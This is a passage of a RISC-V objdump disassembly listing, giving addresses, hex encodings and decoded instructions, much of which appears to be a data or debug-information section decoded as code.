    163e:	0001                	nop
    1640:	cc00                	sw	s0,24(s0)
    1642:	e219                	bnez	a2,1648 <_tbss_end+0x15c4>
    1644:	08000003          	lb	zero,128(zero) # 4d4f0 <_tbss_end+0x4d46c>
    1648:	0299                	addi	t0,t0,6
    164a:	4908                	lw	a0,16(a0)
    164c:	0000                	unimp
    164e:	d400                	sw	s0,40(s0)
    1650:	0a00                	addi	s0,sp,272
    1652:	061a                	slli	a2,a2,0x6
    1654:	0000                	unimp
    1656:	0874                	addi	a3,sp,28
    1658:	0000                	unimp
    165a:	0000790b          	0x790b
    165e:	1900                	addi	s0,sp,176
    1660:	0200                	addi	s0,sp,256
    1662:	0708                	addi	a0,sp,896
    1664:	006e                	c.slli	zero,0x1b
    1666:	0000                	unimp
    1668:	1a0a                	slli	s4,s4,0x22
    166a:	0006                	c.slli	zero,0x1
    166c:	8b00                	0x8b00
    166e:	0008                	0x8
    1670:	0b00                	addi	s0,sp,400
    1672:	0079                	c.nop	30
    1674:	0000                	unimp
    1676:	1a0a0007          	0x1a0a0007
    167a:	0006                	c.slli	zero,0x1
    167c:	9b00                	0x9b00
    167e:	0008                	0x8
    1680:	0b00                	addi	s0,sp,400
    1682:	0079                	c.nop	30
    1684:	0000                	unimp
    1686:	681d0017          	auipc	zero,0x681d0
    168a:	0801                	addi	a6,a6,0
    168c:	029e                	slli	t0,t0,0x7
    168e:	0008c307          	flq	ft6,0(a7) # 4000 <_tbss_end+0x3f7c>
    1692:	1900                	addi	s0,sp,176
    1694:	034d                	addi	t1,t1,19
    1696:	0000                	unimp
    1698:	a108                	fsd	fa0,0(a0)
    169a:	1b02                	slli	s6,s6,0x20
    169c:	000008c3          	fmadd.s	fa7,ft0,ft0,ft0,rne
    16a0:	1900                	addi	s0,sp,176
    16a2:	00000323          	sb	zero,6(zero) # 681d168c <_tbss_end+0x681d1608>
    16a6:	a208                	fsd	fa0,0(a2)
    16a8:	1802                	slli	a6,a6,0x20
    16aa:	000008d3          	fadd.s	fa7,ft0,ft0,rne
    16ae:	00f0                	addi	a2,sp,76
    16b0:	590a                	lw	s2,160(sp)
    16b2:	d3000003          	lb	zero,-720(zero) # fffffffffffffd30 <_end+0xffffffff7ffe4870>
    16b6:	0008                	0x8
    16b8:	0b00                	addi	s0,sp,400
    16ba:	0079                	c.nop	30
    16bc:	0000                	unimp
    16be:	001d                	c.nop	7
    16c0:	5f0a                	lw	t5,160(sp)
    16c2:	0000                	unimp
    16c4:	e300                	sd	s0,0(a4)
    16c6:	0008                	0x8
    16c8:	0b00                	addi	s0,sp,400
    16ca:	0079                	c.nop	30
    16cc:	0000                	unimp
    16ce:	001d                	c.nop	7
    16d0:	681e                	ld	a6,448(sp)
    16d2:	0801                	addi	a6,a6,0
    16d4:	09030283          	lb	t0,144(t1) # 6090 <_tbss_end+0x600c>
    16d8:	0009                	c.nop	2
    16da:	1f00                	addi	s0,sp,944
    16dc:	0484                	addi	s1,sp,576
    16de:	0000                	unimp
    16e0:	9a08                	0x9a08
    16e2:	0b02                	slli	s6,s6,0x0
    16e4:	0000074f          	fnmadd.s	fa4,ft0,ft0,ft0,rne
    16e8:	ba1f 0005 0800      	0x8000005ba1f
    16ee:	9b0b02a3          	sb	a6,-1627(s6) # fffffffffffe59a5 <_end+0xffffffff7ffca4e5>
    16f2:	0008                	0x8
    16f4:	0000                	unimp
    16f6:	1a0a                	slli	s4,s4,0x22
    16f8:	0006                	c.slli	zero,0x1
    16fa:	1900                	addi	s0,sp,176
    16fc:	0009                	c.nop	2
    16fe:	0b00                	addi	s0,sp,400
    1700:	0079                	c.nop	30
    1702:	0000                	unimp
    1704:	0018                	0x18
    1706:	9d20                	0x9d20
    1708:	0000                	unimp
    170a:	1200                	addi	s0,sp,288
    170c:	1908                	addi	a0,sp,176
    170e:	0009                	c.nop	2
    1710:	2100                	fld	fs0,0(a0)
    1712:	0000092f          	0x92f
    1716:	0004c017          	auipc	zero,0x4c
    171a:	0000                	unimp
    171c:	0812                	slli	a6,a6,0x4
    171e:	0924                	addi	s1,sp,152
    1720:	0000                	unimp
    1722:	0812                	slli	a6,a6,0x4
    1724:	01e1                	addi	gp,gp,24
    1726:	0000                	unimp
    1728:	4621                	li	a2,8
    172a:	0009                	c.nop	2
    172c:	1700                	addi	s0,sp,928
    172e:	0049                	c.nop	18
    1730:	0000                	unimp
    1732:	1200                	addi	s0,sp,288
    1734:	4c08                	lw	a0,24(s0)
    1736:	0009                	c.nop	2
    1738:	1200                	addi	s0,sp,288
    173a:	3b08                	fld	fa0,48(a4)
    173c:	0009                	c.nop	2
    173e:	0a00                	addi	s0,sp,272
    1740:	06b4                	addi	a3,sp,840
    1742:	0000                	unimp
    1744:	0962                	slli	s2,s2,0x18
    1746:	0000                	unimp
    1748:	0000790b          	0x790b
    174c:	0200                	addi	s0,sp,256
    174e:	2200                	fld	fs0,0(a2)
    1750:	055e                	slli	a0,a0,0x17
    1752:	0000                	unimp
    1754:	3308                	fld	fa0,32(a4)
    1756:	04c01703          	lh	a4,76(zero) # 4d762 <_tbss_end+0x4d6de>
    175a:	0000                	unimp
    175c:	5722                	lw	a4,40(sp)
    175e:	0005                	c.nop	1
    1760:	0800                	addi	s0,sp,16
    1762:	0334                	addi	a3,sp,392
    1764:	c61d                	beqz	a2,1792 <_tbss_end+0x170e>
    1766:	0004                	0x4
    1768:	0600                	addi	s0,sp,768
    176a:	0720                	addi	s0,sp,904
    176c:	0000                	unimp
    176e:	280a                	fld	fa6,128(sp)
    1770:	00015d1b          	srliw	s10,sp,0x0
    1774:	0600                	addi	s0,sp,768
    1776:	00000727          	0x727
    177a:	630a                	ld	t1,128(sp)
    177c:	7c18                	ld	a4,56(s0)
    177e:	0009                	c.nop	2
    1780:	2300                	fld	fs0,0(a4)
    1782:	000008fb          	0x8fb
    1786:	0f02                	slli	t5,t5,0x0
    1788:	981a                	add	a6,a6,t1
    178a:	0000                	unimp
    178c:	2300                	fld	fs0,0(a4)
    178e:	0000094f          	fnmadd.s	fs2,ft0,ft0,ft0,rne
    1792:	1002                	c.slli	zero,0x20
    1794:	981a                	add	a6,a6,t1
    1796:	0000                	unimp
    1798:	0a00                	addi	s0,sp,272
    179a:	009d                	addi	ra,ra,7
    179c:	0000                	unimp
    179e:	09bc                	addi	a5,sp,216
    17a0:	0000                	unimp
    17a2:	0000790b          	0x790b
    17a6:	0100                	addi	s0,sp,128
    17a8:	2400                	fld	fs0,8(s0)
    17aa:	074e                	slli	a4,a4,0x13
    17ac:	0000                	unimp
    17ae:	2502                	fld	fa0,0(sp)
    17b0:	ac12                	fsd	ft4,24(sp)
    17b2:	0009                	c.nop	2
    17b4:	0900                	addi	s0,sp,144
    17b6:	01b48003          	lb	zero,27(s1)
    17ba:	0080                	addi	s0,sp,64
    17bc:	0000                	unimp
    17be:	0a00                	addi	s0,sp,272
    17c0:	0614                	addi	a3,sp,768
    17c2:	0000                	unimp
    17c4:	09e2                	slli	s3,s3,0x18
    17c6:	0000                	unimp
    17c8:	0000790b          	0x790b
    17cc:	0100                	addi	s0,sp,128
    17ce:	2400                	fld	fs0,8(s0)
    17d0:	086d                	addi	a6,a6,27
    17d2:	0000                	unimp
    17d4:	2602                	fld	fa2,0(sp)
    17d6:	d20e                	sw	gp,36(sp)
    17d8:	0009                	c.nop	2
    17da:	0900                	addi	s0,sp,144
    17dc:	01b49003          	lh	zero,27(s1)
    17e0:	0080                	addi	s0,sp,64
    17e2:	0000                	unimp
    17e4:	2500                	fld	fs0,8(a0)
    17e6:	0971                	addi	s2,s2,28
    17e8:	0000                	unimp
    17ea:	c302                	sw	zero,132(sp)
    17ec:	0601                	addi	a2,a2,0
    17ee:	0066                	c.slli	zero,0x19
    17f0:	0000                	unimp
    17f2:	2750                	fld	fa2,136(a4)
    17f4:	8000                	0x8000
    17f6:	0000                	unimp
    17f8:	0000                	unimp
    17fa:	00dc                	addi	a5,sp,68
    17fc:	0000                	unimp
    17fe:	0000                	unimp
    1800:	0000                	unimp
    1802:	9c01                	subw	s0,s0,s0
    1804:	0a4c                	addi	a1,sp,276
    1806:	0000                	unimp
    1808:	7326                	ld	t1,104(sp)
    180a:	7274                	ld	a3,224(a2)
    180c:	0200                	addi	s0,sp,256
    180e:	4a1701c3          	fmadd.d	ft3,fa4,ft1,fs1,rne
    1812:	0006                	c.slli	zero,0x1
    1814:	0200                	addi	s0,sp,256
    1816:	5891                	li	a7,-28
    1818:	73657227          	0x73657227
    181c:	0200                	addi	s0,sp,256
    181e:	01c5                	addi	gp,gp,17
    1820:	6608                	ld	a0,8(a2)
    1822:	0000                	unimp
    1824:	0200                	addi	s0,sp,256
    1826:	6891                	lui	a7,0x4
    1828:	b328                	fsd	fa0,96(a4)
    182a:	0001                	nop
    182c:	0200                	addi	s0,sp,256
    182e:	01c6                	slli	gp,gp,0x11
    1830:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
    1834:	0200                	addi	s0,sp,256
    1836:	6491                	lui	s1,0x4
    1838:	2900                	fld	fs0,16(a0)
    183a:	00000703          	lb	a4,0(zero) # 0 <_tdata_begin>
    183e:	1408260b          	0x1408260b
    1842:	0006                	c.slli	zero,0x1
    1844:	0600                	addi	s0,sp,768
    1846:	00800027          	0x800027
    184a:	0000                	unimp
    184c:	4a00                	lw	s0,16(a2)
    184e:	0000                	unimp
    1850:	0000                	unimp
    1852:	0000                	unimp
    1854:	0100                	addi	s0,sp,128
    1856:	9d9c                	0x9d9c
    1858:	000a                	c.slli	zero,0x2
    185a:	2a00                	fld	fs0,16(a2)
    185c:	0000098f          	0x98f
    1860:	bb02                	fsd	ft0,432(sp)
    1862:	1401                	addi	s0,s0,-32
    1864:	0614                	addi	a3,sp,768
    1866:	0000                	unimp
    1868:	9102                	jalr	sp
    186a:	2658                	fld	fa4,136(a2)
    186c:	00637273          	csrrci	tp,0x6,6
    1870:	bb02                	fsd	ft0,432(sp)
    1872:	2601                	sext.w	a2,a2
    1874:	064a                	slli	a2,a2,0x12
    1876:	0000                	unimp
    1878:	9102                	jalr	sp
    187a:	2750                	fld	fa2,136(a4)
    187c:	0064                	addi	s1,sp,12
    187e:	bd02                	fsd	ft0,184(sp)
    1880:	0901                	addi	s2,s2,0
    1882:	0614                	addi	a3,sp,768
    1884:	0000                	unimp
    1886:	9102                	jalr	sp
    1888:	0068                	addi	a0,sp,12
    188a:	a229                	j	1994 <_tbss_end+0x1910>
    188c:	0b000007          	0xb000007
    1890:	0624                	addi	s1,sp,776
    1892:	0049                	c.nop	18
    1894:	0000                	unimp
    1896:	2696                	fld	fa3,320(sp)
    1898:	8000                	0x8000
    189a:	0000                	unimp
    189c:	0000                	unimp
    189e:	0070                	addi	a2,sp,12
    18a0:	0000                	unimp
    18a2:	0000                	unimp
    18a4:	0000                	unimp
    18a6:	9c01                	subw	s0,s0,s0
    18a8:	0afc                	addi	a5,sp,348
    18aa:	0000                	unimp
    18ac:	7326                	ld	t1,104(sp)
    18ae:	0031                	c.nop	12
    18b0:	af02                	fsd	ft0,408(sp)
    18b2:	1801                	addi	a6,a6,-32
    18b4:	064a                	slli	a2,a2,0x12
    18b6:	0000                	unimp
    18b8:	9102                	jalr	sp
    18ba:	2658                	fld	fa4,136(a2)
    18bc:	02003273          	csrrc	tp,0x20,zero
    18c0:	4a2801af          	0x4a2801af
    18c4:	0006                	c.slli	zero,0x1
    18c6:	0200                	addi	s0,sp,256
    18c8:	5091                	li	ra,-28
    18ca:	00316327          	0x316327
    18ce:	b102                	fsd	ft0,160(sp)
    18d0:	1101                	addi	sp,sp,-32
    18d2:	0034                	addi	a3,sp,8
    18d4:	0000                	unimp
    18d6:	9102                	jalr	sp
    18d8:	3263276f          	jal	a4,33bfe <_tbss_end+0x33b7a>
    18dc:	0200                	addi	s0,sp,256
    18de:	01b1                	addi	gp,gp,12
    18e0:	3415                	addiw	s0,s0,-27
    18e2:	0000                	unimp
    18e4:	0200                	addi	s0,sp,256
    18e6:	6e91                	lui	t4,0x4
    18e8:	2900                	fld	fs0,16(a0)
    18ea:	0694                	addi	a3,sp,832
    18ec:	0000                	unimp
    18ee:	ae09770b          	0xae09770b
    18f2:	0000                	unimp
    18f4:	4800                	lw	s0,16(s0)
    18f6:	0026                	c.slli	zero,0x9
    18f8:	0080                	addi	s0,sp,64
    18fa:	0000                	unimp
    18fc:	4e00                	lw	s0,24(a2)
    18fe:	0000                	unimp
    1900:	0000                	unimp
    1902:	0000                	unimp
    1904:	0100                	addi	s0,sp,128
    1906:	499c                	lw	a5,16(a1)
    1908:	2600000b          	0x2600000b
    190c:	a7020073          	0xa7020073
    1910:	1c01                	addi	s8,s8,-32
    1912:	064a                	slli	a2,a2,0x12
    1914:	0000                	unimp
    1916:	9102                	jalr	sp
    1918:	2658                	fld	fa4,136(a2)
    191a:	006e                	c.slli	zero,0x1b
    191c:	a702                	fsd	ft0,392(sp)
    191e:	2601                	sext.w	a2,a2
    1920:	00ae                	slli	ra,ra,0xb
    1922:	0000                	unimp
    1924:	9102                	jalr	sp
    1926:	2750                	fld	fa2,136(a4)
    1928:	0070                	addi	a2,sp,12
    192a:	a902                	fsd	ft0,144(sp)
    192c:	0f01                	addi	t5,t5,0
    192e:	064a                	slli	a2,a2,0x12
    1930:	0000                	unimp
    1932:	9102                	jalr	sp
    1934:	0068                	addi	a0,sp,12
    1936:	7c29                	lui	s8,0xfffea
    1938:	0006                	c.slli	zero,0x1
    193a:	0b00                	addi	s0,sp,400
    193c:	0929                	addi	s2,s2,10
    193e:	00ae                	slli	ra,ra,0xb
    1940:	0000                	unimp
    1942:	260c                	fld	fa1,8(a2)
    1944:	8000                	0x8000
    1946:	0000                	unimp
    1948:	0000                	unimp
    194a:	003c                	addi	a5,sp,8
    194c:	0000                	unimp
    194e:	0000                	unimp
    1950:	0000                	unimp
    1952:	9c01                	subw	s0,s0,s0
    1954:	0b88                	addi	a0,sp,464
    1956:	0000                	unimp
    1958:	7326                	ld	t1,104(sp)
    195a:	0200                	addi	s0,sp,256
    195c:	019f 4a1b 0006      	0x64a1b019f
    1962:	0200                	addi	s0,sp,256
    1964:	5891                	li	a7,-28
    1966:	02007027          	0x2007027
    196a:	01a1                	addi	gp,gp,8
    196c:	00064a0f          	0x64a0f
    1970:	0200                	addi	s0,sp,256
    1972:	6891                	lui	a7,0x4
    1974:	2900                	fld	fs0,16(a0)
    1976:	07c5                	addi	a5,a5,17
    1978:	0000                	unimp
    197a:	5b09210b          	0x5b09210b
    197e:	0001                	nop
    1980:	3e00                	fld	fs0,56(a2)
    1982:	0025                	c.nop	9
    1984:	0080                	addi	s0,sp,64
    1986:	0000                	unimp
    1988:	ce00                	sw	s0,24(a2)
    198a:	0000                	unimp
    198c:	0000                	unimp
    198e:	0000                	unimp
    1990:	0100                	addi	s0,sp,128
    1992:	309c                	fld	fa5,32(s1)
    1994:	000c                	0xc
    1996:	2a00                	fld	fs0,16(a2)
    1998:	0000098f          	0x98f
    199c:	8c02                	jr	s8
    199e:	1401                	addi	s0,s0,-32
    19a0:	0000015b          	0x15b
    19a4:	9102                	jalr	sp
    19a6:	2a48                	fld	fa0,144(a2)
    19a8:	0915                	addi	s2,s2,5
    19aa:	0000                	unimp
    19ac:	8c02                	jr	s8
    19ae:	1e01                	addi	t3,t3,-32
    19b0:	0049                	c.nop	18
    19b2:	0000                	unimp
    19b4:	9102                	jalr	sp
    19b6:	2644                	fld	fs1,136(a2)
    19b8:	656c                	ld	a1,200(a0)
    19ba:	006e                	c.slli	zero,0x1b
    19bc:	8c02                	jr	s8
    19be:	2b01                	sext.w	s6,s6
    19c0:	00ae                	slli	ra,ra,0xb
    19c2:	0000                	unimp
    19c4:	7fb89103          	lh	sp,2043(a7) # 47fb <_tbss_end+0x4777>
    19c8:	0025602b          	0x25602b
    19cc:	0080                	addi	s0,sp,64
    19ce:	0000                	unimp
    19d0:	6c00                	ld	s0,24(s0)
    19d2:	0000                	unimp
    19d4:	0000                	unimp
    19d6:	0000                	unimp
    19d8:	0f00                	addi	s0,sp,912
    19da:	000c                	0xc
    19dc:	2800                	fld	fs0,16(s0)
    19de:	0000087b          	0x87b
    19e2:	8f02                	jr	t5
    19e4:	0f01                	addi	t5,t5,0
    19e6:	009d                	addi	ra,ra,7
    19e8:	0000                	unimp
    19ea:	9102                	jalr	sp
    19ec:	2758                	fld	fa4,136(a4)
    19ee:	0064                	addi	s1,sp,12
    19f0:	9402                	jalr	s0
    19f2:	1001                	c.nop	-32
    19f4:	0c30                	addi	a2,sp,536
    19f6:	0000                	unimp
    19f8:	9102                	jalr	sp
    19fa:	0068                	addi	a0,sp,12
    19fc:	cc2c                	sw	a1,88(s0)
    19fe:	0025                	c.nop	9
    1a00:	0080                	addi	s0,sp,64
    1a02:	0000                	unimp
    1a04:	3400                	fld	fs0,40(s0)
    1a06:	0000                	unimp
    1a08:	0000                	unimp
    1a0a:	0000                	unimp
    1a0c:	2700                	fld	fs0,8(a4)
    1a0e:	0064                	addi	s1,sp,12
    1a10:	9802                	jalr	a6
    1a12:	0b01                	addi	s6,s6,0
    1a14:	0614                	addi	a3,sp,768
    1a16:	0000                	unimp
    1a18:	9102                	jalr	sp
    1a1a:	0060                	addi	s0,sp,12
    1a1c:	1200                	addi	s0,sp,288
    1a1e:	9d08                	0x9d08
    1a20:	0000                	unimp
    1a22:	2900                	fld	fs0,16(a0)
    1a24:	0958                	addi	a4,sp,148
    1a26:	0000                	unimp
    1a28:	5b091f0b          	0x5b091f0b
    1a2c:	0001                	nop
    1a2e:	8600                	0x8600
    1a30:	0024                	addi	s1,sp,8
    1a32:	0080                	addi	s0,sp,64
    1a34:	0000                	unimp
    1a36:	b800                	fsd	fs0,48(s0)
    1a38:	0000                	unimp
    1a3a:	0000                	unimp
    1a3c:	0000                	unimp
    1a3e:	0100                	addi	s0,sp,128
    1a40:	ea9c                	sd	a5,16(a3)
    1a42:	000c                	0xc
    1a44:	2a00                	fld	fs0,16(a2)
    1a46:	0000098f          	0x98f
    1a4a:	7c02                	ld	s8,32(sp)
    1a4c:	1401                	addi	s0,s0,-32
    1a4e:	0000015b          	0x15b
    1a52:	9102                	jalr	sp
    1a54:	2648                	fld	fa0,136(a2)
    1a56:	00637273          	csrrci	tp,0x6,6
    1a5a:	7c02                	ld	s8,32(sp)
    1a5c:	2601                	sext.w	a2,a2
    1a5e:	0cea                	slli	s9,s9,0x1a
    1a60:	0000                	unimp
    1a62:	9102                	jalr	sp
    1a64:	2640                	fld	fs0,136(a2)
    1a66:	656c                	ld	a1,200(a0)
    1a68:	006e                	c.slli	zero,0x1b
    1a6a:	7c02                	ld	s8,32(sp)
    1a6c:	3201                	addiw	tp,tp,-32
    1a6e:	00ae                	slli	ra,ra,0xb
    1a70:	0000                	unimp
    1a72:	7fb89103          	lh	sp,2043(a7)
    1a76:	0024ac2b          	0x24ac2b
    1a7a:	0080                	addi	s0,sp,64
    1a7c:	0000                	unimp
    1a7e:	4200                	lw	s0,0(a2)
    1a80:	0000                	unimp
    1a82:	0000                	unimp
    1a84:	0000                	unimp
    1a86:	bb00                	fsd	fs0,48(a4)
    1a88:	000c                	0xc
    1a8a:	2700                	fld	fs0,8(a4)
    1a8c:	7f020073          	0x7f020073
    1a90:	1601                	addi	a2,a2,-32
    1a92:	0cf1                	addi	s9,s9,28
    1a94:	0000                	unimp
    1a96:	9102                	jalr	sp
    1a98:	2768                	fld	fa0,200(a4)
    1a9a:	0064                	addi	s1,sp,12
    1a9c:	8002                	0x8002
    1a9e:	1001                	c.nop	-32
    1aa0:	0c30                	addi	a2,sp,536
    1aa2:	0000                	unimp
    1aa4:	9102                	jalr	sp
    1aa6:	0060                	addi	s0,sp,12
    1aa8:	ee2c                	sd	a1,88(a2)
    1aaa:	0024                	addi	s1,sp,8
    1aac:	0080                	addi	s0,sp,64
    1aae:	0000                	unimp
    1ab0:	4400                	lw	s0,8(s0)
    1ab2:	0000                	unimp
    1ab4:	0000                	unimp
    1ab6:	0000                	unimp
    1ab8:	2700                	fld	fs0,8(a4)
    1aba:	84020073          	0x84020073
    1abe:	1101                	addi	sp,sp,-32
    1ac0:	064a                	slli	a2,a2,0x12
    1ac2:	0000                	unimp
    1ac4:	9102                	jalr	sp
    1ac6:	2758                	fld	fa4,136(a4)
    1ac8:	0064                	addi	s1,sp,12
    1aca:	8502                	jr	a0
    1acc:	0b01                	addi	s6,s6,0
    1ace:	0614                	addi	a3,sp,768
    1ad0:	0000                	unimp
    1ad2:	9102                	jalr	sp
    1ad4:	0050                	addi	a2,sp,4
    1ad6:	1200                	addi	s0,sp,288
    1ad8:	f008                	sd	a0,32(s0)
    1ada:	000c                	0xc
    1adc:	2d00                	fld	fs0,24(a0)
    1ade:	0812                	slli	a6,a6,0x4
    1ae0:	00a9                	addi	ra,ra,10
    1ae2:	0000                	unimp
    1ae4:	242e                	fld	fs0,200(sp)
    1ae6:	0008                	0x8
    1ae8:	0300                	addi	s0,sp,384
    1aea:	05f4                	addi	a3,sp,716
    1aec:	0049                	c.nop	18
    1aee:	0000                	unimp
    1af0:	23c4                	fld	fs1,128(a5)
    1af2:	8000                	0x8000
    1af4:	0000                	unimp
    1af6:	0000                	unimp
    1af8:	00c2                	slli	ra,ra,0x10
    1afa:	0000                	unimp
    1afc:	0000                	unimp
    1afe:	0000                	unimp
    1b00:	9c01                	subw	s0,s0,s0
    1b02:	0db1                	addi	s11,s11,12
    1b04:	0000                	unimp
    1b06:	7326                	ld	t1,104(sp)
    1b08:	7274                	ld	a3,224(a2)
    1b0a:	0200                	addi	s0,sp,256
    1b0c:	0168                	addi	a0,sp,140
    1b0e:	00061413          	slli	s0,a2,0x0
    1b12:	0300                	addi	s0,sp,384
    1b14:	8891                	andi	s1,s1,4
    1b16:	267e                	fld	fa2,472(sp)
    1b18:	6d66                	ld	s10,88(sp)
    1b1a:	0074                	addi	a3,sp,12
    1b1c:	6802                	ld	a6,0(sp)
    1b1e:	2401                	sext.w	s0,s0
    1b20:	064a                	slli	a2,a2,0x12
    1b22:	0000                	unimp
    1b24:	7e809103          	lh	sp,2024(ra)
    1b28:	7061272f          	0x7061272f
    1b2c:	0200                	addi	s0,sp,256
    1b2e:	016a                	slli	sp,sp,0x1a
    1b30:	0009880b          	0x9880b
    1b34:	0300                	addi	s0,sp,384
    1b36:	b091                	j	137a <_tbss_end+0x12f6>
    1b38:	287f                	0x287f
    1b3a:	0749                	addi	a4,a4,18
    1b3c:	0000                	unimp
    1b3e:	6b02                	ld	s6,0(sp)
    1b40:	0901                	addi	s2,s2,0
    1b42:	0614                	addi	a3,sp,768
    1b44:	0000                	unimp
    1b46:	7fb89103          	lh	sp,2043(a7)
    1b4a:	0730                	addi	a2,sp,904
    1b4c:	0009                	c.nop	2
    1b4e:	0200                	addi	s0,sp,256
    1b50:	016e                	slli	sp,sp,0x1b
    1b52:	7e08                	ld	a0,56(a2)
    1b54:	00800023          	sb	s0,0(zero) # 0 <_tdata_begin>
    1b58:	0000                	unimp
    1b5a:	4600                	lw	s0,8(a2)
    1b5c:	0000                	unimp
    1b5e:	0000                	unimp
    1b60:	0000                	unimp
    1b62:	0100                	addi	s0,sp,128
    1b64:	079c                	addi	a5,sp,960
    1b66:	4891                	li	a7,4
    1b68:	2306                	fld	ft6,64(sp)
    1b6a:	0190                	addi	a2,sp,192
    1b6c:	2606                	fld	fa2,64(sp)
    1b6e:	02006863          	bltu	zero,zero,1b9e <_tbss_end+0x1b1a>
    1b72:	016e                	slli	sp,sp,0x1b
    1b74:	491a                	lw	s2,132(sp)
    1b76:	0000                	unimp
    1b78:	0200                	addi	s0,sp,256
    1b7a:	5c91                	li	s9,-28
    1b7c:	772a                	ld	a4,168(sp)
    1b7e:	0006                	c.slli	zero,0x1
    1b80:	0200                	addi	s0,sp,256
    1b82:	016e                	slli	sp,sp,0x1b
    1b84:	b125                	j	17ac <_tbss_end+0x1728>
    1b86:	000d                	c.nop	3
    1b88:	0200                	addi	s0,sp,256
    1b8a:	5091                	li	ra,-28
    1b8c:	c028                	sw	a0,64(s0)
    1b8e:	02000007          	0x2000007
    1b92:	0170                	addi	a2,sp,140
    1b94:	b70c                	fsd	fa1,40(a4)
    1b96:	000d                	c.nop	3
    1b98:	0200                	addi	s0,sp,256
    1b9a:	6891                	lui	a7,0x4
    1b9c:	0000                	unimp
    1b9e:	0812                	slli	a6,a6,0x4
    1ba0:	0000015b          	0x15b
    1ba4:	0812                	slli	a6,a6,0x4
    1ba6:	0614                	addi	a3,sp,768
    1ba8:	0000                	unimp
    1baa:	f42e                	sd	a1,40(sp)
    1bac:	0008                	0x8
    1bae:	0300                	addi	s0,sp,384
    1bb0:	05c8                	addi	a0,sp,708
    1bb2:	0049                	c.nop	18
    1bb4:	0000                	unimp
    1bb6:	2328                	fld	fa0,64(a4)
    1bb8:	8000                	0x8000
    1bba:	0000                	unimp
    1bbc:	0000                	unimp
    1bbe:	0056                	c.slli	zero,0x15
    1bc0:	0000                	unimp
    1bc2:	0000                	unimp
    1bc4:	0000                	unimp
    1bc6:	9c01                	subw	s0,s0,s0
    1bc8:	0e02                	slli	t3,t3,0x0
    1bca:	0000                	unimp
    1bcc:	6626                	ld	a2,72(sp)
    1bce:	746d                	lui	s0,0xffffb
    1bd0:	0200                	addi	s0,sp,256
    1bd2:	015d                	addi	sp,sp,23
    1bd4:	4a18                	lw	a4,16(a2)
    1bd6:	0006                	c.slli	zero,0x1
    1bd8:	0300                	addi	s0,sp,384
    1bda:	9891                	andi	s1,s1,-28
    1bdc:	2f7f                	0x2f7f
    1bde:	00706127          	0x706127
    1be2:	5f02                	lw	t5,32(sp)
    1be4:	0b01                	addi	s6,s6,0
    1be6:	0988                	addi	a0,sp,208
    1be8:	0000                	unimp
    1bea:	7fa89103          	lh	sp,2042(a7) # 47fa <_tbss_end+0x4776>
    1bee:	3100                	fld	fs0,32(a0)
    1bf0:	0994                	addi	a3,sp,208
    1bf2:	0000                	unimp
    1bf4:	c602                	sw	zero,12(sp)
    1bf6:	ca0d                	beqz	a2,1c28 <_tbss_end+0x1ba4>
    1bf8:	001f 0080 0000      	0x80001f
    1bfe:	5e00                	lw	s0,56(a2)
    1c00:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
    1c04:	0000                	unimp
    1c06:	0100                	addi	s0,sp,128
    1c08:	429c                	lw	a5,0(a3)
    1c0a:	3200000f          	0x3200000f
    1c0e:	0000090f          	0x90f
    1c12:	c602                	sw	zero,12(sp)
    1c14:	521e                	lw	tp,228(sp)
    1c16:	0300000f          	fence	rw,unknown
    1c1a:	a891                	j	1c6e <_tbss_end+0x1bea>
    1c1c:	327f                	0x327f
    1c1e:	080d                	addi	a6,a6,3
    1c20:	0000                	unimp
    1c22:	c602                	sw	zero,12(sp)
    1c24:	b13a                	fsd	fa4,160(sp)
    1c26:	000d                	c.nop	3
    1c28:	0300                	addi	s0,sp,384
    1c2a:	a091                	j	1c6e <_tbss_end+0x1bea>
    1c2c:	337f                	0x337f
    1c2e:	6d66                	ld	s10,88(sp)
    1c30:	0074                	addi	a3,sp,12
    1c32:	c602                	sw	zero,12(sp)
    1c34:	4a4e                	lw	s4,208(sp)
    1c36:	0006                	c.slli	zero,0x1
    1c38:	0300                	addi	s0,sp,384
    1c3a:	9891                	andi	s1,s1,-28
    1c3c:	337f                	0x337f
    1c3e:	7061                	c.lui	zero,0xffff8
    1c40:	0200                	addi	s0,sp,256
    1c42:	5bc6                	lw	s7,112(sp)
    1c44:	0988                	addi	a0,sp,208
    1c46:	0000                	unimp
    1c48:	7f909103          	lh	sp,2041(ra)
    1c4c:	7034                	ld	a3,96(s0)
    1c4e:	0200                	addi	s0,sp,256
    1c50:	18c8                	addi	a0,sp,116
    1c52:	064a                	slli	a2,a2,0x12
    1c54:	0000                	unimp
    1c56:	6201                	0x6201
    1c58:	8924                	0x8924
    1c5a:	02000007          	0x2000007
    1c5e:	0fc9                	addi	t6,t6,18
    1c60:	064a                	slli	a2,a2,0x12
    1c62:	0000                	unimp
    1c64:	7fb89103          	lh	sp,2043(a7)
    1c68:	6334                	ld	a3,64(a4)
    1c6a:	0068                	addi	a0,sp,12
    1c6c:	ca02                	sw	zero,20(sp)
    1c6e:	4910                	lw	a2,16(a0)
    1c70:	0000                	unimp
    1c72:	0100                	addi	s0,sp,128
    1c74:	3559                	addiw	a0,a0,-10
    1c76:	7265                	lui	tp,0xffff9
    1c78:	0072                	c.slli	zero,0x1c
    1c7a:	ca02                	sw	zero,20(sp)
    1c7c:	4914                	lw	a3,16(a0)
    1c7e:	0000                	unimp
    1c80:	3400                	fld	fs0,40(s0)
    1c82:	756e                	ld	a0,248(sp)
    1c84:	006d                	c.nop	27
    1c86:	cb02                	sw	zero,148(sp)
    1c88:	7416                	ld	s0,352(sp)
    1c8a:	0008                	0x8
    1c8c:	0200                	addi	s0,sp,256
    1c8e:	5891                	li	a7,-28
    1c90:	fe24                	sd	s1,120(a2)
    1c92:	0000                	unimp
    1c94:	0200                	addi	s0,sp,256
    1c96:	07cc                	addi	a1,sp,964
    1c98:	0049                	c.nop	18
    1c9a:	0000                	unimp
    1c9c:	9102                	jalr	sp
    1c9e:	2454                	fld	fa3,136(s0)
    1ca0:	07ba                	slli	a5,a5,0xe
    1ca2:	0000                	unimp
    1ca4:	cc02                	sw	zero,24(sp)
    1ca6:	490d                	li	s2,3
    1ca8:	0000                	unimp
    1caa:	0200                	addi	s0,sp,256
    1cac:	5091                	li	ra,-28
    1cae:	4324                	lw	s1,64(a4)
    1cb0:	02000007          	0x2000007
    1cb4:	14cc                	addi	a1,sp,612
    1cb6:	0049                	c.nop	18
    1cb8:	0000                	unimp
    1cba:	9102                	jalr	sp
    1cbc:	244c                	fld	fa1,136(s0)
